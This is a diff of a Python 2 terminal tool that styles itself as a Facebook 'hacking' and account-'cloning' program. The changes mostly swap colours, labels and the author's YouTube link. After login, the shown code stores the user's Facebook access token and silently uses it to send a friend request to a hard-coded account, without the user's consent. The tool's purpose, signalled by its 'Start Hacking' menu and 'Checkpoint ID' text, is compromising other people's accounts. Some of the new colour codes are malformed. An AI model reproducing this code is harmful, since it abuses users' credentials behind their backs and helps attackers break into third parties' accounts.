@@ -50,8 +50,8 @@ def jalan(z):
 logo = """
 \033[1;91m     . `'-;-'´. ₱ⱤØ₲Ɽ₳₥₥ɆⱤ : ₥Ɽ ₭łⱠⱠɆⱤ .;-'´.
 \033[1;96m        ʏօʊȶʊɮɛ : ʍʀ ӄɨʟʟɛʀ ɢǟʍɨռɢ ʐօռɛ 
-\033[1;98m     	◦•●◉✿ TikTok Ⓔ mrkillerpro1: ✿◉●•◦
-\033[1;96m     {•------» Ｗ.A : +923107104146 : «------•}
+\033[1;30m     	◦•●◉✿ TikTok Ⓔ mrkillerpro1: ✿◉●•◦
+\033[1;36m     {•------» Ｗ.A : +923107104146 : «------•}
 \033[1;91m    """
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -71,9 +71,9 @@ vuln = "\033[32mVuln"
 os.system("clear")
 jalan("\033[1;98m   _   _  ___     _     _  _    _    ____  ___    ")
 jalan("\033[1;97m ( `-' )(   )   ( ) __( )( )  ( )  (  __)(   ) ")
-jalan("\033[1;95m | \_/ || O  |  | |/ /| || |  | |  | |_  | O  |  ") 
+jalan("\033[1,34m | \_/ || O  |  | |/ /| || |  | |  | |_  | O  |  ") 
 jalan("\033[1;94m ( ) ( )( _ (   ( _ ( ( )( )_ ( )_ (  _) ( _ (  ")
-jalan("\033[1;93m /_\ /_\/_\\_|  /_\\_|/_\/___\/___\/____\/_\\_|")
+jalan("\033[1,34m /_\ /_\/_\\_|  /_\\_|/_\/___\/___\/____\/_\\_|")
 print  """
 
 \033[1;92m .-,--.     .         .           
@@ -81,14 +81,14 @@ print  """
 \033[1;92m ,|    ,-| |<  | `-. |  ,-| | |
 \033[1;92m `'    `-^ ' ` ' `-' `' `-^ ' '  
 
-\033[1;97m ************************************************
-\033[1;96m ~ IM NOT RESPONSIBLE FOR ANY MISS USE MR Killer ~
-\033[1;97m ************************************************
-\033[1;95m Stay Home 💓
-\033[1;95m Stay Safe 💓
+\033[1,34m ************************************************
+\033[1,34m ~ IM NOT RESPONSIBLE FOR ANY MISS USE MR Killer ~
+\033[1,34m ************************************************
+\033[1,34m Stay Home 💓
+\033[1,34m Stay Safe 💓
 \033[1;95m Queto : Everting is Possible in The World.( Bill Gates ) 
-\033[1;95m Certified From APTECH Learning Pakistan (SGD).
-\033[1;95m
+\033[1;30m Certified From APTECH Learning Pakistan (SGD).
+\033[1,34m
 """
 
 
@@ -148,8 +148,8 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successfully'
+				os.system('xdg-open https://www.youtube.com/channel/UCTglz1c1p3ase3t11kWVFag')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -201,8 +201,8 @@ def menu():
 	print "\033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "\033[1;36;40m      ╚═════════════════════════════════╝"
-	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start♥Hacking"																												
-	print "    \033[1;32;40m[Type0] \033[1;33;40m‹•.•›Logout"
+	print "    \033[1;32;40m[1] \033[1;33;40m‹•.•›Start♥Hacking"																												
+	print "    \033[1;32;40m[0] \033[1;33;40m‹•.•›Logout"
 	pilih()
 
 def pilih():
@@ -290,7 +290,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m●══════════════════◄►══════════════════●"
 
-	jalan('           \033[1;91m Start cloning Please Wait...')
+	jalan('           \033[1;30m Start cloning Please Wait...')
 	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
 
 	def main(arg):
@@ -520,7 +520,7 @@ def pilih_super():
  
          Checkpoint ID Open After 7 Days
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m Programmer : Mr Killer (Ihtesham Jahangir) \033[1;95m :
+: \033[1;34m Programmer : Mr Killer (Ihtesham Jahangir) \033[1;34m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
               \033[1;91m Ihtesham Jahangir Ranjha """
